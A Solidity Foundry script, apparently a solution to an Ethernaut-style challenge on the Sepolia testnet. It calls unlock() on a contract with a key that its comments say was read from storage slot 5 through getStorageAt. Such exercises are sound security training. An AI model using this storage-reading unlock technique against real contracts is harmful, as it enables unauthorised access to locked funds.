// SPDX-License-Identifier: UNLICENSED

// /*
pragma solidity 0.8.19;

import {Script, console} from "forge-std/Script.sol";

// Attack contract address: "0x162a28a721cf0bf42e3d533a9FB97C3be4bbBB6C"

interface IAttack {
    function unlock(bytes32) external;
}

contract TriggerAttack is Script {
    IAttack public attack;
    address attackAddr = 0x162a28a721cf0bf42e3d533a9FB97C3be4bbBB6C;

    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        // address account = vm.addr(privateKey);

        vm.startBroadcast(privateKey);
        attack = IAttack(attackAddr);
        vm.stopBroadcast();

        vm.startBroadcast(privateKey);
        attack.unlock(
            0x7d216107543b84c3ce3f43dfad48bf3a0f2a94c702c207826a17e60897ed24dc
        );
        vm.stopBroadcast();
    }
}
// To get the slot value i.e. , enter the following command in the browser console
// await web3.eth.getStorageAt(instance, 5, console.log)
// I don't know the equivalent of the above command in foundry, but can be done in hardhat

// forge script script/TriggerAttack.s.sol:TriggerAttack --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv
